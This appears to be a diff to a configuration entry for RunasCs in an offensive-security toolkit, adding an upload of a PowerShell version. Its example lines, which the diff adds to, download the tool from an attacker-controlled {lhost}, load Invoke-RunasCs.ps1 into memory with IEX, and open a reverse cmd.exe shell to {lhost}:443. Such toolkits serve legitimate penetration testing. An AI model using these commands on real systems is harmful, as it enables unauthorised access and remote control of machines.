@@ -7,8 +7,8 @@ licence = "GPL-3.0"
 arch = "x86_64"
 examples = [
   "iwr http://{lhost}/RunasCs.exe -OutFile RunasCs.exe",
-  "RunasCs.exe <user> <password> \"cmd /c whoami /all\"",
   "RunasCs.exe <user> <password> cmd.exe -r {lhost}:443",
+  "IEX(IWR -UseBasicParsing http://{lhost}/Invoke-RunasCs.ps1); Invoke-RunasCs -Username <user> -Password <password> -Command cmd.exe -Remote {lhost}:443",
 ]
 
 [[upload]]
@@ -20,3 +20,8 @@ note = "Windows with .NET 4"
 path = "files/RunasCs_net2.exe"
 as = "RunasCs_net2.exe"
 note = "Windows with .NET 2"
+
+[[upload]]
+path = "files/Invoke-RunasCs.ps1"
+as = "Invoke-RunasCs.ps1"
+note = "The same tool as a PowerShell script, to load in memory"
